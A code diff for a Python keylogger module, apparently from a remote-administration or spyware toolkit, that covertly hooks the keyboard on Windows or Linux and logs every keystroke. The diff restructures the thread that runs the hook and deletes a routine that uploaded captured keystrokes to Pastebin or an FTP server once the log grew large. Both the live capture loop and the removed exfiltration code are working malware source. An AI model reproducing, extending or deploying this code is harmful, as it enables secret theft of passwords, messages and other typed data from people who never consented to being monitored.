@@ -39,7 +39,6 @@ client host machine and optionally upload them to Pastebin
 or an FTP server 
 """
 
-
 # main
 def _event(event):
     try:
@@ -62,42 +61,14 @@ def _event(event):
     return True
 
 @util.threaded
-def _run():
+def run():
+    """ 
+    Run the keylogger
+
+    """
     while True:
         hm = pyHook.HookManager() if os.name == 'nt' else pyxhook.HookManager()
         hm.KeyDown = _event
         hm.HookKeyboard()
         pythoncom.PumpMessages() if os.name == 'nt' else time.sleep(0.1)
         if globals()['abort']: break
-
-@util.threaded
-def auto():
-    """ 
-    Automatically log and upload keystrokes
-
-    """
-    while True:
-        try:
-            if globals()['logs'].tell() > globals()['max_size']:
-                result = util.pastebin(globals()['logs']) if mode == 'pastebin' else util.ftp(globals()['logs'], filetype='.txt')
-                results.put(result)
-                globals()['logs'].reset()
-            elif globals()['abort']:
-                break
-            else:
-                time.sleep(1)
-        except Exception as e:
-            util.log("{} error: {}".format(auto.func_name, str(e)))
-            break
-
-def run():
-    """ 
-    Run the keylogger
-
-    """
-    try:
-        if 'keylogger' not in globals()['threads'] or not globals()['threads']['keylogger'].is_alive():
-            globals()['threads']['keylogger'] = _run()
-        return True
-    except Exception as e:
-        util.log(str(e))
